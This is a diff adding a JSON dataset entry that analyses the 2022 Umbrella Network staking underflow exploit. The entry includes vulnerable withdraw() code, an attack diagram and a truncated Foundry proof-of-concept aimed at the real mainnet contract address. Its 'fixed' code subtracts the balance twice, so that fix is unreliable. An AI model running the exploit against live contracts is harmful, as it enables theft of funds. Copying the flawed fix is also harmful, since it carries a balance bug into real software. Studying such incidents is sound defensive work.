@@ -1,0 +1,30 @@
+{
+ "id": "2022__2022-03-17_Umbrella_StakingUnderflowDrain",
+ "source_file": "2022/2022-03-17_Umbrella_StakingUnderflowDrain.md",
+ "title": "Umbrella Network — Staking Underflow Exploit Analysis",
+ "date": "2022-03-17",
+ "protocol": "Umbrella Network",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$700,000 (UniLP tokens)",
+ "loss_usd": 700000.0,
+ "root_cause": "Missing underflow check in the `withdraw(amount)` function during `_balances[user] - amount` computation, allowing any address with zero staked balance to withdraw large amounts",
+ "attack_tx": null,
+ "vulnerable_contract": "StakingRewards 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE",
+ "classes": [
+  "integer-precision"
+ ],
+ "code_before": [
+  "❌ Vulnerable StakingRewards.withdraw() (pseudocode)\n// Solidity 0.7.x or version without SafeMath\ncontract StakingRewards {\n    mapping(address => uint256) private _balances;\n    IERC20 public stakingToken;\n\n    function withdraw(uint256 amount) public {\n        //",
+  "❌ No underflow check\n        // _balances[msg.sender] = 0, amount = 8,792,873,290,680,252,648,282\n        // 0 - 8,792...282 = type(uint256).max - 8,792...282 + 1 (underflow)\n        _balances[msg.sender] = _balances[msg.sender] - amount;\n\n        // Actual token transfer follows\n        stakingToken.transfer(msg.sender, amount);\n        emit Withdrawn(msg.sender, amount);\n    }\n}\n\n//",
+  "// ❌ Root cause: missing underflow check in `withdraw(amount)` during `_balances[user] - amount` computation, allowing any address with zero staked balance to withdraw large amounts\n    function withdraw(uint256 amount) override public {  // ❌ Vulnerability\n        _withdraw(amount, msg.sender, msg.sender);\n    }"
+ ],
+ "code_after": [
+  "✅ Solidity 0.8.x and above (automatic underflow check)\ncontract StakingRewardsFixed {\n    function withdraw(uint256 amount) public {\n        //",
+  "✅ Outside unchecked blocks, Solidity 0.8+ reverts automatically\n        _balances[msg.sender] -= amount; // auto-reverts on insufficient balance\n\n        // Additional protection: explicit validation\n        require(_balances[msg.sender] >= amount, \"insufficient balance\");\n        _balances[msg.sender] -= amount;\n        stakingToken.transfer(msg.sender, amount);\n    }\n}\n\n//"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker (0x1751e3...)\n    │\n    ├─[1] No staked balance\n    │       _balances[attacker] = 0\n    │\n    ├─[2] Calls StakingRewards.withdraw(8,792,873,290,680,252,648,282)\n    │       ⚡ Underflow triggered:\n    │       _balances[attacker] = 0 - 8,792,873,290,680,252,648,282\n    │                           = type(uint256).max - 8,792...282 + 1\n    │                           = enormous positive value\n    │\n    ├─[3] Contract transfers 8,792... UniLP to attacker\n    │       (entire LP balance held by contract can be drained)\n    │\n    └─[4] Loss: ~$700,000 UniLP",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IStakingRewards {\n    // ⚡ Vulnerable function: no balance underflow check\n    function withdraw(uint256 amount) external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ContractTest is Test {\n    IStakingRewards stakingRewards =\n        IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);\n    IERC20 UniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);\n    address attacker = 0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 14_421_983);\n    }\n\n    function testExploit() public {\n        emit log_named_uint(\n            \"[Before] Attacker staked balance\",\n            stakin"
+ ]
+}
